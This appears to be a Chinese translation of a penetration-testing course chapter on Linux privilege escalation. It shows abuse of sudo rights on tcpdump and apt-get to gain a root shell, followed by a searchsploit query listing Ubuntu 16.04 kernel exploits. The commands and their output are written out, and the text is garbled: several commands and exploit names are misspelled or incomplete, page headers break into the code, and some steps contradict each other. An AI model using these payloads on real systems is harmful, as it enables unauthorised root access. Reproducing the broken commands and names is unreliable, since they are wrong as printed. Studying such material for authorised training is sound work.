
太棒了！我们在另一个配置错误向量后成功获取了 root shell。

## 17.4.2 滥用 sudo

在 Unix 系统上，`sudo` 工具允许我们以提升的权限执行命令。为了能够使用 `sudo`，我们的低权限用户必须是 `sudo` 组的成员（在基于 Debian 的 Linux 发行版中）。"`sudo`" 代表 "Super-Do"，我们可以将其理解为更改执行命令的有效用户 ID。

`sudo` 的自定义配置可以在 `/etc/sudoers` 文件中实现。我们可以使用 `sudo -list` 列出当前用户允许的命令。

用户 `joe` 在 `debian-privesc` 上可以运行以下命令：
`(ALL) ALL /usr/bin/crontab -t, /usr/sbin/tcpdump, /usr/bin/apt-get`
列表 503 - 检查当前用户的 sudo 权限

从输出列表 503 中，我们注意到 `crontab`、`tcpdump` 和 `apt-utility` 被列为允许的 `sudo` 命令。

如果 `/etc/sudoers` 权限过于宽松，用户可以使用短暂的管理员 root 权限获得 root 访问。

由于两个允许的命令中的第一个不允许我们编辑 `crontab`，因此不太可能利用它来获取权限提升。第二个命令看起来很有前景，所以让我们浏览 GTFOBins 以获取关于如何滥用它的建议。然而，运行命令后显示了一个意料之外的结果：

```
joe@debian-privesc:$ COMMAND='id'

joe@debian-privesc:$ TF=$(mktemp)
```

# 使用 Kali Linux 进行 OffSec 渗透测试

```
joe@debian-privesc:$ echo "$COMMAND"

joe@debian-privesc:$ chmod +x "$TF"

joe@debian-privesc:$ sudo tcpdump -i lo -w /dev/null -G 1 -z "$TF"

[sudo] password for joe:

dropped privileges to root

tcpdump: listening on lo, link-type Ethernet, capture size 262144 bytes

/dev/null failed: Permission denied
```

列表 504 - 尝试滥用 `tcpdump` 权限

惊讶的是，一旦我们执行了建议的命令，我们就收到了“permission denied”的消息提示。为了调查元凶，我们可以检查 syslog 文件中任何 `tcpdump` 的出现情况。

```
joe@debian-privesc:$ cat /var/log/syslog | grep tcpdump
```

```
Aug 29 02:52:14 debian-privesc kernel: [5742] audit:type=14 apparmor="DENIED" operation="exec" file="/usr/bin/tcpdump" name="/tmp/tmp" pid=2280 comm="tcpdump" requested_mask="x" denied_mask="" uid=1000
```

列表 505 - 检查 syslog 文件中的 "`tcpdump`" 相关事件

列表 505 中的输出显示 `auditd` 守护记录了我们的权限提升尝试。仔细检查发现 AppArmor 被触发并阻止。我们可以以 root 身份使用 `aa-status` 命令验证 AppArmor 的状态。

```
joe@debian-privesc:$ su - root

Password:

root@debian-privesc:$ aa-status

apparmor module is loaded.

20 profiles are loaded.

18 profiles are in enforce mode.

2 profiles are in complain mode.

0 processes are unconfined but have a profile defined.
```

列表 506 - 验证 AppArmor 状态

列表 506 确认 `sudoers` 中的第一个命令不起作用，让我们检查第三个允许的 `sudo` 命令：`apt-get`。回到 GTFOBins，我们将选择第一个选项 (a)。负载首先运行 `apt-get changelog` 命令选项，从从中执行 `bash` shell。

```
sudo apt-get changelog

/bin/sh
```

列表 507 - '`apt-get`' 权限提升负载

我们可以通过在活动 shell 中复制 `joe@debian-privesc:- sudo apt-get changelog` 来尝试其他方法。

```
joe@debian-privesc:-$ sudo apt-get changelog

...

Fetched 459 KB in 0s (39.7 MB/s)

# id

uid=0(root) gid=0(root) groups=(root)
```

列表 508 - 通过滥用 `sudo` 权限获取 root shell

# OffSec

使用 Kali Linux 进行渗透测试

```
joe@ubuntu-ubuntu:~$ uname -r

4.4.0-116-generic
```

```
joe@ubuntu-ubuntu:~$ arch

x86_64
```

从我们的目标系统获取内核和架构信息：它似乎运行在 `x86_64` 架构上的 Ubuntu 16.04.3 LTS（内核 `4.4.0-116-generic`）。利用这些信息，我们在本地的 Kali 系统上使用 `searchsplit`⁸⁷ 来查找与目标版本匹配的内核漏洞。我们想使用 "`linux kernel Ubuntu 16 Local Privilege Escalation`" 作为主要关键词。我们还想过滤掉输出中的杂内容，因此排除内核版本 4.4.0 以下以及任何匹配内核版本 4.8 的内容。

```
kali@kali:~$ searchsplit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4.4" | grep -v " < 4.4 " | grep -v " 4.8"
```

```
Linux Kernel (Debian 7.7/8.5/9.0 - Ubuntu 14.04.2/16.04.2/17 / Fedora 22 / 25 /
Centos 7.3.1611) | _ldso_hwack Clash' Local Privilege Escalation | linux_x86-64/local/4226.c
Linux Kernel (Debian 9/0 - Ubuntu 14.04.5/16.04.2/17 / Fedora 23/24 /)
_ldso_dynamic Stack Clash' Local Privilege Escalation |
linux_x86-64/local/4227.c
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlays' Local Privilege Escalation (1)
linux/local/3916.c
Linux Kernel (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)
linux/local/40759.rb
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) Netfilter 'target_offset' Out-of-Bounds
Privilege Escalation | linux_x86-64/local/40409.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fudput()' (BPF_PROG_LOAD) Privilege
linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6Q_0_SET_REPLACE' Local Privilege Escalation
linux/local/40849.txt
Linux Kernel 2.6.34 (Ubuntu 10.0 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation
(-)
linux_x86-64/local/15916.c
```
